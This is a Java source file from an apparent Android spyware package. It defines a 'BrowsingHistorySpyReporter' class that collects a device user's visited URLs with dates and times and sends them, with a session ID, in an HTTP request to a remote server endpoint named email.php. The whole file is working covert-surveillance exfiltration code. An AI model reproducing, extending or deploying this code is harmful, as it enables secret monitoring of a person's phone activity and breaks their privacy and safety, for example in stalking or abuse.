package org.ddth.android.spy.reporter;

import java.util.HashMap;
import java.util.Map;

import org.ddth.http.core.connection.Request;
import org.ddth.mobile.monitor.core.Report;
import org.ddth.mobile.monitor.report.BrowsingHistory;
import org.ddth.mobile.monitor.report.HistoryUrl;

public class BrowsingHistorySpyReporter extends SpyReporter {

	@Override
	protected Request createRequest(Report report) {
		BrowsingHistory history = (BrowsingHistory) report;
		StringBuilder content = new StringBuilder();
		for (HistoryUrl url : history.urls) {
			String date = LOG_DATE_FORMAT.format(url.date);
			String time = LOG_TIME_FORMAT.format(url.date);
			content.append(date + "\t" + time + "\t" + url.url + "\r");
		}
		Map<String, String> parameters = new HashMap<String, String>();
		parameters.put("sID", getSession());
		parameters.put("content", content.toString());
		return new Request(WEBAPI_SERVER_ROOT + "/email.php", parameters);
	}
}
